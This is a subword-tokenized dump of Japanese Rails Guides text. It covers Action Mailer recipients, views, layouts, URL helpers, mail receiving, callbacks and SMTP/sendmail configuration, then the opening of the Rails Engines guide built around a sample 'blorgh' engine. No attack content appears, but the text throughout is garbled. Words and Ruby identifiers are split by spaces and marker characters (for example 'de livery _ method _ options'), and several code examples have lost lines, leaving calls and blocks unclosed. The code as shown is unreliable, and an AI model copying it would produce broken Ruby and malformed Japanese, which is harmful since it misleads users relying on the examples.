▁1 つの メール を 複数の 相手 に 送信 すること も もちろん 可能です ▁( サインアップ が 新 規 に 行われた ことを 全 管理者 に 通知 する など )。 これ を行なう には 、 メールの リスト を `: to ` キー に設定し ます 。
▁ メールの リスト の 形式 は 、 メールアドレス の配列 でも 、 メールアドレスを カ ン マ で 区切 った 文字列 でも 構 いません 。
▁class ▁ Admin Mailer ▁< ▁Action Mailer :: Base
▁ default ▁to : ▁ Proc . new ▁ { ▁ Admin . p l u c k (: email ) ▁ } ,
▁ from : ▁' not if i c ation @ example . com '
▁def ▁ new _ re g ist r ation ( user )
▁ mail ( subject : ▁" New ▁User ▁S ig n up : ▁# {@ user . email } ")
▁C C ▁( カ ー ボ ン コピー ) ▁ や B C C ▁( ブ ラ イン ド カ ー ボ ン コピー ) ▁ アドレス を指定する 場合に も 同じ 形式 を使用できます 。 それぞれ `: c c ` キー と `: b c c ` キー を使用します 。
▁#### ▁ メールアドレスを 名前 で 表示する
▁ 受信 者 の メールアドレスを メール に そのまま 表示する の ではなく 、 受信 者 の名前 で 表示 したい ことがあります 。
▁これ を行なう には 、 メールアドレスを ` " フル ネ ー ム ▁< メールアドレス > " ` の 形式 で 指定 します 。
▁def ▁ welcome _ email ( user )
▁@ user ▁= ▁ user
▁ email _ with _ name ▁= ▁% (" # {@ user . name } " ▁< # {@ user . email } > )
▁ mail ( to : ▁ email _ with _ name , ▁ subject : ▁' Welcome ▁to ▁ M y ▁A w e some ▁S it e ')
▁### ▁ メイラー の ビュー
▁ メイラー の ビュー は ` app / views / name _ of _ mailer _ class ` ディレクトリ に 置かれます 。
▁ 個 別の メイラー ビュー は 、 その 名前 が メイラー メソッド と同じ になる ので 、 クラス から 認 識 できます 。
▁ 先 の例 の場合 、` welcome _ email ` メソッド で使用する メイラー ビュー は 、 HTML 版 であれば ` app / views / user _ mailer / welcome _ email . html . erb ` が 使用 され 、 プ レ ー ン テキスト であれば ` welcome _ email . text . erb ` が使用されます 。
▁ アクション で使用する デフォルトの メイラー ビュー を変更する には 、 たとえば 以下のように します 。
▁ mail ( to : ▁@ user . email ,
▁ subject : ▁' Welcome ▁to ▁ M y ▁A w e some ▁S it e ',
▁ template _ path : ▁' not if i cat ions ',
▁ template _ name : ▁' an other ')
▁上のコードは 、` an other ` という名前の テンプレート を ` app / views / not if i cat ions ` ディレクトリ 以下 から 探 索 します 。
▁` template _ path ` には パス の配列 を指定する こともできます 。 この場合 探 索 は 配列 順に 沿 って 行われます 。
▁ より 柔 軟 性 の 高 い 方法 を使用したい場合 は 、 ブロック を 1 つ 渡 して 特定の テンプレート を レンダリング したり 、 テンプレート を使用 せずに イン ラ イン または テキスト で レンダリング することもできます 。
▁ subject : ▁' Welcome ▁to ▁ M y ▁A w e some ▁S it e ') ▁do ▁| format |
▁ format . html ▁ { ▁render ▁' an other _ template ' ▁ }
▁ format . text ▁ { ▁render ▁ text : ▁' Re nder ▁ text ' ▁ }
▁上のコードは 、 HTML の 部分を ' an other _ template . html . erb ' テンプレート を使用して レンダリング し 、 テキスト 部分を `: text ` で レンダリング しています 。
▁ レンダリング の コマンド は Action ▁ Controller で 使用されている もの と同じ なので 、`: text `、` : in line ` などの オプション も すべて 同様に 使用できます 。
▁### ▁Action ▁Mailer の レイアウト
▁ メイラー も コントローラの ビュー と同様 の 方法で レイアウト を 設定 できます 。
▁ メイラー で使用する レイアウト 名 は メイラー と同じ 名前 である 必要があります 。 たとえば 、` user _ mailer . html . erb ` や ` user _ mailer . text . erb ` という レイアウト は自動的に メイラー で レイアウト として 認 識 されます 。
▁ 別の レイアウト ファイル を明示的に指定 したい場合は 、 メイラー で ` layout ` を呼び出します 。
▁ layout ▁' a w e some ' ▁# ▁a w e some . ( html | text ). erb を レイアウト として 使用する
▁ コントローラの ビュー と同様に 、` yield ` を使用して レイアウト 内の ビュー を レンダリング できます 。
▁ format ブロック 内で render メソッド 呼び出し に ` layout : ▁' layout _ name ' ` オプションを 渡す ことで 、 フォーマット ごとに 異なる レイアウト を指定する こともできます 。
▁ mail ( to : ▁ user . email ) ▁do ▁| format |
▁ format . html ▁ { ▁render ▁ layout : ▁' my _ layout ' ▁ }
▁ format . text
▁上のコードは 、 HTML の 部分 については ` my _ layout . html . erb ` レイアウト ファイルを 明示的に 使用 して レンダリング し 、 テキスト の 部分 については 通常の ` user _ mailer . text . erb ` があれば それ を使用して レンダリング します 。
▁### ▁Action ▁Mailer の ビューで URL を生成する
▁ メイラー が コントローラ と 異なる 点 の ひとつ は 、 メイラー の インスタンス は サーバー に 届 く HTTP リクエスト の コンテキスト と 無 関係 であること です 。 アプリケーションの ホスト 情報を メイラー 内で 使用 したい場合は `: host ` パラメータ を明示的に指定 します 。
▁`: host ` に 指定 する 値 は その アプリケーション 内で 共通 である の が 普通 なので 、` config / application . rb ` に 以下の 記述 を追加して グ ロー バ ル に 利用 できるようにします 。
▁config . action _ mailer . default _ url _ options ▁= ▁ { ▁ host : ▁' example . com ' ▁ }
▁` * _ path ` ヘルパーは 、 動作 の 性 質 上 メール 内で は 一 切 使用 できない 点 に ご注意ください 。
▁ メール で URL が 必要な 場合は ` * _ url ` ヘルパー を使用して ください 。
▁ 以下 に 例 を示します 。
▁<%= ▁ link _ to ▁' よう こ そ ', ▁ welcome _ path ▁%>
▁上のコード の 代りに 、 以下のコード を使用する 必要があります 。
▁<%= ▁ link _ to ▁' よう こ そ ', ▁ welcome _ url ▁%>
▁ こうすることで フル パス の URL が 引 用 され 、 メールの URL が 正常に 機能 する ようになります 。
▁#### ▁` url _ for ` を使用して URL を生成する
▁`: host ` オプションを グ ロー バ ル に設定し ていない 場合は 、` url _ for ` に `: host ` オプションを 明示的に 渡す 必要がある ことにご注意ください 。
▁<%= ▁ url _ for ( host : ▁' example . com ',
▁ controller : ▁' welcome ',
▁ action : ▁' g re e t ing ') ▁%>
▁#### ▁ 名前付き ルーティング を使用して URL を生成する
▁ メール クライアント は Web サーバー の コンテキスト から 切り 離 されている ので 、 メール に 記 載 する パス では Web の アドレス の ベース URL は 補 完 されません 。
▁従って 、 名前付き ルーティング ヘルパー についても ▁" * _ path " ▁ ではなく ▁" * _ url " ▁ を使用する 必要があります 。
▁`: host ` オプションを グ ロー バ ル に設定し ていない 場合は 、 " * _ url " ▁ ヘルパー に `: host ` オプションを 明示的に 渡す 必要がある ことにご注意ください 。
▁<%= ▁ user _ url (@ user , ▁ host : ▁' example . com ') ▁%>
▁### ▁ マ ル チ パ ート メールを送信 する
▁ ある アクションに 複数の 異なる テンプレート がある と 、 Action ▁Mailer によって自動的に マ ル チ パ ート 形式 の メール が 送信 されます 。
▁User Mailer を 例 にとって 説明します 。 ` app / views / user _ mailer ` ディレクトリ に ` welcome _ email . text . erb ` と ` welcome _ email . html . erb ` という テンプレート がある と 、 Action ▁Mailer は それぞれの テンプレート から HTML メール と テキスト メール を生成し 、 マ ル チ パ ート 形式 の メール として ひとつ に まとめ て 自動的に 送信 します 。
▁ マ ル チ パ ート メール に 挿 入 される パ ート の 順序 は ` Action Mailer :: Base . default ` メソッドの `: part s _ order ` によって 決 まり ます 。
▁### ▁ メール 送信 時に 配信 オプションを 動的 に変更 する
▁S M T P 認 証 情報 などの デフォルトの 配信 オプションを メール 配信 時に 上 書き したい場合 、 メイラー の アクション で ` de livery _ method _ options ` を使用して 変更 することができます 。
▁def ▁ welcome _ email ( user , ▁ com p any )
▁@ url ▁= ▁ user _ url (@ user )
▁ de livery _ options ▁= ▁ { ▁ user _ name : ▁ com p any . smtp _ user ,
▁ password : ▁ com p any . smtp _ password ,
▁ address : ▁ com p any . smtp _ host ▁ }
▁ subject : ▁" 添 付 の 利用 規 約 を参照してください ",
▁ de livery _ method _ options : ▁ de livery _ options )
▁### ▁ テンプレート を レンダリング せずに メール 送信 する
▁ メール 送信 時に テンプレート の レンダリング を スキップ して メール 本 文 を 単なる 文字列 に した くなる ことがあります 。
▁ このような 場合には `: body ` オプション を使用できます 。
▁この オプション を使用する場合 は 、 必ず `: content _ type ` オプション も 指定 してください 。
▁ 指定 し なかった 場合は デフォルトの ` text / plain ` が 適 用 されます 。
▁def ▁ welcome _ email ( user , ▁ email _ body )
▁ mail ( to : ▁ user . email ,
▁ body : ▁ email _ body ,
▁ content _ type : ▁" text / html ",
▁ subject : ▁" レンダリング しました ")
▁ メール を 受信 する
▁Action ▁Mailer を使用する メールの 受信 と 解 析 は 、 メール 送信 に 比 べ て や や 複 雑 です 。
▁Rails アプリケーションで メール を 受信 できるように するために は 、 その 前に メール 受信 待 ち する Rails アプリケーションに 何らかの 形 で メール が 転 送 される ように しておく必要があります 。
▁Rails アプリケーションで メール を 受信 できるように するために は 、 以下の 作業 が 必要 になります 。
▁* ▁ メイラー に ` re ce ive ` メソッド を実装する
▁* ▁` / ( アプリ の パス ) / bin / rails ▁run n er ▁' User Mailer . re ce ive ( S T D IN . read ) ' ` で メール を 受信 する アプリケーションに 、 メール サーバー から メール を 転 送 する 。
▁ いずれ か の メイラー に ` re ce ive ` メソッド を定義する と 、 受信 した 生 の メール は Action ▁Mailer によって 解 析 され 、 email オブジェクト に変換 されて デ コード された 後 、 メイラー が 新 た に インスタンス 化 され 、 その メイラー の ` re ce ive ` インスタンス メソッド に渡され ます 。
▁ 以下 に 例 を示します 。
▁def ▁ re ce ive ( email )
▁ page ▁= ▁P age . find _ by ( address : ▁ email . to . first )
▁ page . email s . create (
▁ subject : ▁ email . subject ,
▁ body : ▁ email . body
▁ )
▁if ▁ email . has _ attachment s ?
▁ email . attachment s . each ▁do ▁| attachment |
▁ page . attachment s . create ( {
▁ file : ▁ attachment ,
▁ de script ion : ▁ email . subject
▁ })
▁Action ▁Mailer の コールバック
▁Action ▁Mailer では ` before _ action `、` after _ action ` および ` ar ound _ action ` という コールバック を 指定できます 。
▁* ▁ コントローラ と同様 、 メイラー クラスの メソッド にも フィルタ 付き の ブロック または シンボル を 1 つ 指定 することができます 。
▁* ▁` before _ action ` コールバック を使用して mail オブジェクト に デフォルト値 や de livery _ method _ options を 与え たり 、 デフォルトの ヘッダ と 添 付 を 挿 入 することもできます 。
▁* ▁` after _ action ` コールバック も ` before _ action ` と同様 の設定 を行います が 、 メイラー の アクション 内の インスタンス変数 を使用します 。
▁ after _ action ▁: set _ de livery _ options ,
▁: prev ent _ de livery _ to _ guest s ,
▁: set _ b us in ess _ header s
▁def ▁ feed b ack _ message ( b us in ess , ▁ user )
▁@ b us in ess ▁= ▁ b us in ess
▁ mail
▁def ▁c am p a ig n _ message ( b us in ess , ▁ user )
▁ private
▁def ▁ set _ de livery _ options
▁# ▁ここでは メールの インスタンス や
▁# ▁@ b us in ess や @ user インスタンス変数 にアクセス できる
▁if ▁@ b us in ess ▁ & & ▁@ b us in ess . has _ smtp _ settings ?
▁ mail . de livery _ method . settings . merge ! (
▁def ▁ prev ent _ de livery _ to _ guest s
▁if ▁@ user ▁ & & ▁@ user . guest ?
▁ mail . perform _ deliver ies ▁= ▁false
▁def ▁ set _ b us in ess _ header s
▁if ▁@ b us in ess
▁ header s [ " X - S M T P API - C A T E G O R Y "] ▁= ▁@ b us in ess . code
▁* ▁ メールの body に nil 以外の 値が 設定 されている 場合 、 Mailer ▁F il ter s は 処理 を 中 止 します 。
▁Action ▁Mailer ヘルパー を使用する
▁Action ▁Mailer は ` A b s tr a ct Controller ` を継承し ている ので 、 Action ▁ Controller と同様に 一般的な ヘルパーメソッド を使用できます 。
▁Action ▁Mailer を設定する
▁以下の 設定 オプションは 、 environment . rb や production . rb などの 環境 設定 ファイル のいずれか で使用する の が 最 適 です 。
▁| ▁ 設定 ▁| ▁ 説明 ▁|
▁| --------------- | - - ----------- |
▁| ` logger ` | 可能 であれば メール 送 受信 に関する 情報 を生成します 。
▁` nil ` を指定すると ログ 出力 を 行 わ なくなります 。
▁Ruby 自身 の ` Logger ` ロガー および ` L o g 4 r ` ロガー の どちら とも 互 換 性 があります 。
▁| ` smtp _ settings ` | `: smtp ` の 配信 メソッド の詳細 設定 を行います 。
▁< ul >< li > `: address ` ▁- ▁ リモート の メール サーバー の 使用 を 許可 する 。
▁デフォルトは ` " localhost " ` であり 、 必要に応じて 変更 する 。 </ li >
▁< li > `: port ` ▁- ▁ メール サーバー が 万 一 ポート 2 5 番 で 動作 していない 場合は ここで 変更 する 。 </ li >
▁< li > `: do main ` ▁- ▁ H E L O ドメイン を指定する 必要がある 場合は ここで 行なう 。 </ li >
▁< li > `: user _ name ` ▁- ▁ メール サーバー で 認 証 が 必要な 場合は ここで ユーザー名 を指定する 。 </ li >
▁< li > `: password ` ▁- ▁ メール サーバー で 認 証 が 必要な 場合は ここで パスワード を指定する 。 </ li >
▁< li > `: authentication ` ▁- ▁ メール サーバー で 認 証 が 必要な 場合は ここで 認 証 の 種類 を指定する 。
▁| ` s end mail _ settings ` | `: s end mail ` の 配信 オプションを 上 書き します 。
▁< ul >< li > `: location ` ▁- ▁ s end mail の 実行 可能 ファイルの 場所 を指定する 。
▁デフォルトは ` / us r / s bin / s end mail ` 。 </ li >
▁< li > `: ar g um ent s ` ▁- ▁ s end mail に 渡す コマンドライン 引数 を指定する 。
▁デフォルトは ` - i ▁- t ` 。 </ li ></ ul > |
▁| ` raise _ de livery _ errors ` | メール 配信 に 失敗した場合 に エラー を 発生 する かどうかを指定します 。
▁この オプションは 、 外部 の メール サーバー が 即 時 配信 を行って いる 場合に のみ 機能 します 。
▁| ` de livery _ method ` | 配信 方法 を指定します 。
▁以下の 配信 方法 を 指定 可能です 。 < ul >
▁< li > `: smtp ` ▁( default ) ▁-- ▁` config . action _ mailer . smtp _ settings ` で 設定 可能 。 </ li >
▁< li > `: s end mail ` ▁-- ▁` config . action _ mailer . s end mail _ settings ` で 設定 可能 。 </ li >
▁< li > `: file `: ▁-- ▁ メール を ファイル として 保存 する 。 ` config . action _ mailer . file _ settings ` で 設定 可能 。 </ li >
▁< li > `: test `: ▁-- ▁ メール を 配列 ` Action Mailer :: Base . deliver ies ` に保存 する 。 </ li >
▁</ ul > 詳 細 については [ API ドキュメント ]( http :// api . rubyonrails . org / classes / Action Mailer / Base . html ) を参照 。
▁| ` perform _ deliver ies ` | Mail の メッセージ に ` deliver ` メソッドを 実行 したときに 実際に メール 配信 を行なう かどうかを指定します 。
▁ デフォルトで は 配信 が 行われます 。 機能 テスト など で 配信 を 一時 的に オフ に したい場合 に 便利です 。
▁| ` deliver ies ` | ` de livery _ method ▁: test ` を使用して Action ▁Mailer から 送信された メール の配列 を保持し ます 。
▁ 単 体 テスト および 機能 テスト で 最も 便利です 。
▁| ` default _ options ` | ` mail ` メソッド オプション ▁( `: from `、` : re p ly _ to ` など ) の デフォルト値 を設定します 。
▁ 設定 オプション の 完全な 説明 については 「 Rails アプリケーション を設定する 」 ガイド の [ Action ▁Mailer を設定する ]( config ur ing . html # action - mailer を設定する ) を参照してください 。
▁### ▁Action ▁Mailer の設定 例
▁ 適切な ` config / environments / $ R A I L S _ ENV . rb ` ファイル に追加する 設定 の例 を以下に示します 。
▁config . action _ mailer . de livery _ method ▁= ▁: s end mail
▁デフォルトは 以下の とおりです 。
▁# ▁config . action _ mailer . s end mail _ settings ▁= ▁ {
▁# ▁ location : ▁' / us r / s bin / s end mail ',
▁# ▁ ar g um ent s : ▁' - i ▁- t '
▁config . action _ mailer . perform _ deliver ies ▁= ▁true
▁config . action _ mailer . raise _ de livery _ errors ▁= ▁true
▁config . action _ mailer . default _ options ▁= ▁ { from : ▁' no - re p ly @ example . com ' }
▁### ▁ G mail 用の Action ▁Mailer 設定
▁Action ▁Mailer に [ Mail ▁gem ]( https :// github . com / m i ke l / mail ) が 導入 された ので 、` config / environments / $ R A I L S _ ENV . rb ` ファイルの 設定 は 以下のように 非常に 簡単に なりました 。
▁config . action _ mailer . de livery _ method ▁= ▁: smtp
▁config . action _ mailer . smtp _ settings ▁= ▁ {
▁ address : ▁' smtp . g mail . com ',
▁ port : ▁5 8 7 ,
▁do main : ▁' example . com ',
▁ user _ name : ▁' < ユーザー名 > ',
▁ password : ▁' < パスワード > ',
▁ authentication : ▁' plain ',
▁ en able _ start t l s _ auto : ▁true ▁ }
▁ メイラー のテスト
▁ メイラー のテスト 方法 の詳細については テスティング ガイド の [ メイラー をテストする ]( testing . html # メイラー をテストする ) を参照してください 。
▁ メール を 配信 直 前に 加 工 する
▁ ---- ---------------
▁ メール を 配信 する 前に 何らかの 編集 を加え たい ことがあります 。
▁ 幸 い 、 Action ▁Mailer には すべての メールの 配信 前に 処理 を加え るため の フック が 提供され ています 。
▁これ を使用して 、 メール が 配信 エ ー ジ ェ ン ト に 最終的に 渡 される 直 前に メール の内容 を変更 するための イン ター セ プ タ を 登録 することができます 。
▁class ▁S and box E mail In ter ce p to r
▁def ▁self . deliver ing _ email ( message )
▁ message . to ▁= ▁ [' s and box @ example . com ']
▁ イン ター セ プ タ が 動作する ように するには 、 Action ▁Mailer フレームワーク に 登録 する必要があります 。
▁これは 、 以下のように イニシャライザ ファイル ` config / initializers / s and box _ email _ in ter ce p to r . rb ` で 行います 。
▁NOT E : ▁上の 例 では " s tag ing " という カスタマイズ した 環境 を使用しています 。 これは 本番 ▁( production 環境 ) ▁ に 準 じ た 状態 で テスト を行う ための 環境 です 。
▁Rails の カスタム 環境 については [ Rails 環境 を作成する ]( config ur ing . html # rails 環境 を作成する ) を参照してください 。
▁Rails ▁ エンジン 入 門
▁ 本ガイドで は 、 Rails の エンジン について解説します 。 また 、 簡潔 で 使い やすい インターフェイス を使った 、 ホスト アプリケーション 向け 追加 機能 についても 解説します 。
▁* ▁ エンジンの 役 割
▁* ▁ エンジンの 生成 方法
▁* ▁ エンジンの ビ ル ド 機能
▁* ▁ エンジン を アプリケーションに フック する
▁* ▁ アプリケーションの エンジン 機能を 上 書き する
▁Rails における エンジンの 役 割
▁ エンジン ▁( engine ) ▁ とは 、 アプリケーションの ミ ニ チ ュ ア のような もの であり 、 ホスト アプリケーションに 機能 を提供します 。
▁Rails アプリケーション は 実際には エンジン に 「 ター ボ を かけ た 」 ような もの に す ぎ ず 、` Rails :: Application ` クラス は ` Rails :: Engine ` から 多くの 振る舞い を継承し ています 。
▁従って 、 エンジン と アプリケーション は 、 細 か な 違 い を 除 け ば ほぼ 同じ もの である と 考え ていた だ いて よいでしょう 。 本ガイドで も この 点 を た び た び 確認 します 。
▁ エンジン と アプリケーション は 、 同じ 構造 を 共有 しています 。
▁ エンジン は 、 プラグイン とも 密 接 に 関連 します 。
▁ エンジン も プラグイン も 、 共通 の ` lib ` ディレクトリ 構造 を 共有 し 、 どちら も ` rails ▁ p l ug in ▁ new ` ジェネレータ を使用して 生成されます 。
▁ 両者 に 違 い がある と すれば 、 Rails は エンジン を 一 種 の 「 完全な プラグイン 」 と み な している 点 です 。 これは 、 エンジン を生成する には ジェネレータ コマンドで ` - - full ` を与える こと から も わかり ます 。
▁ 実際には この ガイド では ` - - m o un table ` オプション を使用します 。 これは ` - - full ` の オプション 以外に も いくつかの 機能を 追加 してくれます 。
▁ 以後 本ガイドで は 「 完全な プラグイン ▁( full ▁ p l ug in )」 を 単 に 「 エンジン 」 と呼びます 。
▁ エンジン は プラグイン になる ことも でき 、 プラグイン が エンジン になる こともできます 。
▁ 本ガイドで 説明 のために 作成する エンジン に ▁" blorgh " ▁( blog の も じ り ) ▁という 名前 を 付け ます 。
▁この エンジン は ブログ 機能を ホスト アプリケーション に追加 し 、 記事 と コメント を作成 できます 。
▁ 本ガイドで は 、 最初に この エンジン を 単 体 で 動作する ように し 、 後に この エンジン を アプリケーションに フック します 。
▁ エンジン は ホスト アプリケーション と 混 じ らない よう 分 離 しておく こともできます 。
▁これは 、 ある アプリケーション が ` articles _ path ` のような ルーティング ヘルパー によって パス を 提 供 できる と すると 、 その アプリケーションの エンジン も 同じ く ` articles _ path ` という ヘルパー によって パス を 提 供 でき 、 しか も 両者 が 衝 突 しない ということ を 意味 します 。
▁これ に とも ない 、 コントローラ 名 、 モデル名 、 テーブル 名 は いずれ も 名前空間化され ます 。
▁これ については 本ガイドで 後 述 します 。
▁ ここ が 重要です 。 アプリケーション は ▁** い か な る 場合 も ** ▁ エンジン よりも 優 先 されます 。
▁ ある 環境 において 、 最終的な 決 定 権 を持つ のは アプリケーション 自身 です 。
▁ エンジン は アプリケーションの 動作 を 大 幅 に変更 する もの ではなく 、 アプリケーションを 単 に 拡 張 する ものです 。
▁その 他の エンジン に関する ドキュメント については 、[ D e v is e ]( https :// github . com / p l at a format ec / de v is e ) ▁( 親 アプリケーションに 認 証 機能を 提 供 する エンジン ) ▁ や ▁[ F or e m ]( https :// github . com / r ad ar / for e m ) ▁( フ ォ ー ラ ム 機能を 提 供 する エンジン ) ▁ を参照してください 。
▁この 他 に 、[ S pre e ]( https :// github . com / s pre e / s pre e ) ▁( e コ マ ー ス プラットフォーム ) ▁ や [ Re f in e ry C M S ]( https :// github . com / ref in e ry / ref in e ry c m s ) ▁( C M S エンジン ) ▁ など もあります 。
▁ 追 伸 。 エンジン 機能 は J am es ▁A d am 、 P io tr ▁S ar n ack i 、 Rails コア チ ー ム 、 そして 多くの 人 々 の 助 け な し では でき あ が ら なかった でしょう 。
▁ 彼 ら に 会 う ことが あった ら 、 ぜ ひ お 礼 を 述 べ て や って ください 。
▁ エンジン を生成する
▁ エンジン を生成する には 、 プラグイン ジェネレータ を実行し 、 必要に応じて オプションを ジェネレータ に 渡します 。
▁" blorgh " の場合は マウント 可能な エンジン として 生成 する ので 、 ターミナル で 以下のコマンドを実行し ます 。
▁ プラグイン ジェネレータ で 利用できる オプション の 一覧 をすべて 表示する には 、 以下 を 入力 します 。
▁` - - m o un table ` オプションは 、 マウント 可能 かつ 名前空間 で 分 離 された エンジン を生成する 場合に 使用します 。
▁この ジェネレータ で 生成 した プラグイン は 、` - - full ` オプション を使用した 場合 と同じ ス ケ ル ト ン 構造 を 持 ち ます 。
▁` - - full ` オプションは 、 以下 を 提 供 する ス ケ ル ト ン 構造 を含む エンジン を作成します 。
▁* ▁` app ` ディレクトリ ツ リ ー
▁* ▁` config / routes . rb ` ファイル
▁Rails . application . routes . d raw ▁do
▁* ▁` lib / blorgh / engine . rb ` ファイルは 、 Rails アプリケーション が 標準 で 持つ ` config / application . rb ` ファイル と 同 一 の 機能を 持 ち ます 。
▁ module ▁ Blorgh
▁class ▁ Engine ▁< ▁ :: Rails :: Engine
▁end
▁` - - m o un table ` オプション を使用すると 、` - - full ` オプション に 以下 が追加され ます 。
▁* ▁ アセット マニフェストファイル ▁( ` application . js ` および ` application . css ` )
▁* ▁ 名前空間化され た ` Application Controller ` ス タブ
▁ 名前空間化され た ` Application Helper ` ス タブ
▁* ▁ エンジン で使用する レイアウト ビュー テンプレート
▁* ▁` config / routes . rb ` で の 名前空間 分 離
▁ Blorgh :: Engine . routes . d raw ▁do
▁* ▁` lib / blorgh / engine . rb ` で の 名前空間 分 離
▁is ol at e _ name space ▁ Blorgh
▁さらに 、` - - m o un table ` オプションは ダ ミ ー のテスト 用 アプリケーションを ▁` test / d um my ` に 配置 する よう ジェネレータ に 指示 します 。 これは 、 以下の ダ ミ ー アプリケーションの ルーティング ファイルを ` test / d um my / config / routes . rb ` に追加 すること によって 行います 。
▁ m o un t ▁ Blorgh :: Engine ▁=> ▁" / blorgh "
▁### ▁ エンジンの 内部
▁#### ▁ 重要な ファイル
▁ 新しく 作成した エンジンの ルート ディレクトリ には 、` blorgh . gem spec ` という ファイルが 置かれます 。
▁ アプリケーションに この エンジン を 後 から インクルード するには 、` Gemfile ` に 以下の行 を追加します 。
▁gem ▁' blorgh ', ▁ path : ▁" vendor / engine s / blorgh "
▁ Gemfile を更新し たら 、 いつものように ` bundle ▁install ` を実行する の を 忘れ ずに 。
▁ エンジン を 通常の gem と同様に ` Gemfile ` に 記述 すると 、 Bundler は gem と同様に エンジン を 読み込み 、` blorgh . gem spec ` ファイルを 解 析 し 、` lib ` 以下 に置かれている ファイル ▁( この場合 ` lib / blorgh . rb ` ) ▁ を require します 。
▁この ファイルは 、 ( ` lib / blorgh / engine . rb ` に置かれている ) ▁` blorgh / engine . rb ` ファイルを require し 、` Blorgh ` という 基本 モジュール を定義し ます 。
▁require ▁" blorgh / engine "
▁ module ▁ Blorgh
▁ TIP : ▁ エンジン によって は 、 この ファイルを エンジンの ための グ ロー バ ル 設定 オプション として 配置 したい ことも ある でしょう 。
▁これは 比 較 的 よい アイディア です 。 設定 オプションを 提供し たい場合は 、 エンジン で ` module ` と 呼ばれ ている ファイルを 、 ま さ に これ を行なう の に ふ さ わ しい 場所 として 定義 します 。
▁その モジュール の中に メソッドを 置 く ことで 準備 は 完了 します 。
▁ エンジンの 基本 クラス は ` lib / blorgh / engine . rb ` の中に あります 。
▁class ▁ Engine ▁< ▁ :: Rails :: Engine
▁is ol at e _ name space ▁ Blorgh
▁` Rails :: Engine ` クラス を 継 承 すること によって 、 指定された パス に エンジン がある ことが gem から Rails に 通知 され 、 アプリケーションの 内部 に エンジン が正しく マウント されます 。 そして 、 エンジンの ` app ` ディレクトリ を モデル / メイラー / コントローラ / ビュー の 読み込み パス に追加します 。
▁ここで 、` is ol at e _ name space ` メソッド について 特別な 注意 が必要です 。
▁このメソッド の 呼び出し は 、 エンジンの コントローラ / モデル / ルーティング など が 持つ 固有の 名前空間 を 、 アプリケーション 内部 の コンポーネント が 持つ 類 似 の 名前空間 から 分 離 する 役 目 を 担 います 。
▁この 呼び出し が行われ ない と 、 エンジンの コンポーネント が アプリケーション 側 に 「 漏 れ 出 す 」 リ ス ク が生じ 、 思 わ ぬ 動作 が発生し たり 、 エンジンの 重要な コンポーネント が 同じ ような 名前 の アプリケーション 側 コンポーネント によって 上 書き されて し ま った り する 可能性があります 。
▁ 名前 の 衝 突 の例 として 、 ヘルパー を 取り上げ ましょう 。
▁` is ol at e _ name space ` が 呼び出され ない と 、 エンジンの ヘルパー が アプリケーションの コントローラに インクルード され てしまう 可能性があります 。
▁NOT E : ▁` Engine ` クラスの 定義 に含まれる ` is ol at e _ name space ` の 行 を変更 / 削除 しない ことを ▁** 強 く ** ▁ 推 奨 します 。
▁この 行 が変更され ると 、 生成された エンジン 内の クラス が アプリケーション と 衝 突 する ▁** 可能性があります ** ▁ 。
▁ 名前空間 を 分 離 する ということ は 、` bin / rails ▁ g ▁ model ` の 実行 によって 生成された モデル ▁( ここでは ▁` bin / rails ▁ g ▁ model ▁ article ` を実行し た とします ) ▁ は ` Article ` に な らず 、 名前空間化され て ` Blorgh :: Article ` になる ということです 。
▁さらに モデルの テーブル も 名前空間化され 、 単なる ` articles ` ではなく ` blorgh _ articles ` になります 。
▁ コントローラ も モデル と同様に 名前空間化され ます 。 ` Article sController ` という コントローラ は ` Blorgh :: Article sController ` になり 、 この コントローラの ビュー は ` app / views / articles ` ではなく ` app / views / blorgh / articles ` に 置かれます 。
▁ メイラー も同様に 名前空間化され ます 。
▁最後に 、 ルーティング も エンジン 内で 分 離 されます 。
▁これは 名前空間 化 の 最も 肝 心 な 部分 であり 、 これ については 本 ガイド の [ ルーティング ]( # ルーティング ) セクション で 後 述 します 。
▁#### ▁` app ` ディレクトリ
▁ エンジンの ` app ` ディレクトリ の中に は 、 通常の アプリケーションで お な じ み の 標準 の ` assets `、` controllers `、` helpers `、` mailer s `、` models `、` views ` ディレクトリ が 置かれます 。
▁ こ のうち ` helpers `、` mailer s `、` models ` ディレクトリ に はデフォルトで は 何も 置 か れ ないので 、 本 セクション では 解 説 しません 。
▁ モデル については 、 エンジンの 作成 について 解 説 する セクション で 後 述 します 。
▁ エンジンの ` app / assets ` ディレクトリ の下に も 、 通常の アプリケーション と同様に ` images `、` javascripts `、` stylesheets ` ディレクトリ が それぞれ あります 。
▁ 通常の アプリケーション と 異なる 点 は 、 これらの ディレクトリ の下に は さらに エンジン 名 を持つ サブディレクトリ がある ことです 。
▁これは 、 エンジン が 名前空間化され る の と同様 、 エンジンの アセット も同様に 名前空間化され る 必要がある からです 。
▁` app / controllers ` ディレクトリ の下に は ` blorgh ` ディレクトリ が 置かれます 。 この 中に は ` application _ controller . rb ` という ファイルが 1 つ 置かれます 。
▁この ファイルは エンジンの コントローラ 共通 の 機能を 提 供 する ためのものです 。
▁この ` blorgh ` ディレクトリ には 、 エンジン で使用する その他 の コントローラ を 置 きます 。
▁これらの ファイルを 名前空間化され た ディレクトリ に 配置 することで 、 他の エンジン や アプリケーションに 同じ 名前 の コントローラ が あって も 名前 の 衝 突 を避ける 事 が できます 。
▁NOT E : ▁ ある エンジン に含まれる ` Application Controller ` という クラス の名前 は 、 アプリケーション そのもの が 持つ クラス と同じ 名前 になっています 。 これは 、 アプリケーションを エンジン に変換 し や す く する ためです 。
▁最後に 、` app / views ` ディレクトリ の下に は ` layouts ` フォルダ があります 。 ここに は ` blorgh / application . html . erb ` という ファイルが 置かれます 。
▁この ファイルは 、 エンジン で使用する レイアウト を指定する ためのものです 。
▁ エンジン が 単 体 の エンジン として 使用される のであれば 、 この ファイル を使用して い く ら でも 好 き な ように レイアウト を カスタマイズ できます 。 そのため に アプリケーション 自身 の ` app / views / layouts / application . html . erb ` ファイルを 変更 する必要はありません 。
▁ エンジンの レイアウト を ユーザーに 強 制 した く ない場合は 、 この ファイル を削除し 、 エンジンの コントローラ では 別の レイアウト を参照 する ように 変更 してください 。
▁#### ▁` bin ` ディレクトリ
▁この ディレクトリ には ` bin / rails ` という ファイルが 1 つ だけ 置かれます 。 これは アプリケーション 内で 使用している の と 似 た ` rails ` サブ コマンド であり 、 ジェネレータ です 。
▁ このような 構成 になっている ことで 、 この エンジン で 利用 するための 独自の コントローラ や モデル を 以下のように 簡単に 生成 することができます 。
▁$ ▁ bin / rails ▁ g ▁ model
